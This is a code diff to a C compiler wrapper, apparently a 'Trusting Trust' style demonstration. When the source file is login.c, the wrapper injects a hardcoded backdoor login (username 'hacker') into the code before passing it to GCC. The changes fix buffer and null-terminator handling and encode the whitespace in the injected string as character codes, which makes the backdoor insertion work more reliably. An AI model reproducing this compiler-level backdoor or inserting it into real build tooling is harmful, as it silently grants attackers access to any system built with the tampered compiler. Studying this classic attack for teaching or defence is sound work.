@@ -27,26 +27,28 @@ int main(int argc, char *argv[]){
   	int sourceFileSize = ftell(inputFile);
   	rewind(inputFile);
 
-  	//Read source file into buf
-	char *buffer = (char *) malloc(sourceFileSize);
+  	//Read source file into buf with one extra byte to accomodate '\0'
+  	int actualBuffSizeRequired = sourceFileSize + 1;
+	char * buffer = (char *) malloc(actualBuffSizeRequired);
+	buffer[sourceFileSize] = '\0';
 	int read = fread(buffer, sizeof(char), sourceFileSize, inputFile);
 	fclose(inputFile);
 	
 	/* We pass the source code to GCC as the backend compiler */
-
 
 	if(strstr(sourceFilename, "login.c") != NULL){
 
 		char stringToInject[200];
 
 		//Generate malicious code
-		snprintf(stringToInject, 200, "if(strcmp(username, \"hacker\") == 0 && strcmp(password, \"i-hate-numbers\") == 0){\n\t\tprintf(TEXT_AUTHORISED);\n\t\treturn 0;\n\t}\n\n\t");
+		snprintf(stringToInject, 200, "if(strcmp(username, \"hacker\") == 0 && strcmp(password, \"i-hate-numbers\") == 0){%c%c%cprintf(TEXT_AUTHORISED);%c%c%creturn 0;%c%c}%c%c%c", 10, 9, 9, 10, 9, 9, 10, 9, 10, 10, 9);
 
 		int lengthOfMaliciousCode = strlen(stringToInject);
 
-		int newTotalBuffRequired = sourceFileSize + lengthOfMaliciousCode;
+		int newTotalBuffRequired = actualBuffSizeRequired + lengthOfMaliciousCode;
 
-		char * newTempBuffer = (char *) malloc(newTotalBuffRequired);
+		//Use calloc to zero-init the buffer as strncpy later does not copy \0 character
+		char * newTempBuffer = (char *) calloc(newTotalBuffRequired, sizeof(char));
 
 		//Get location of "printf(TEXT_UNAUTHORISED);"
 		char * injectPosition = strstr(buffer, "printf(TEXT_UNAUTHORISED);");
@@ -65,10 +67,10 @@ int main(int argc, char *argv[]){
 		//Replace the existing buffer with the modified buffer with malicious code
 		free(buffer);
 		buffer = newTempBuffer;
-		sourceFileSize = newTotalBuffRequired;
+		//Do not pass \0 character to compiler
+		sourceFileSize = newTotalBuffRequired - 1;
 
 	}
-
 
 
 	char compileCommand[500];
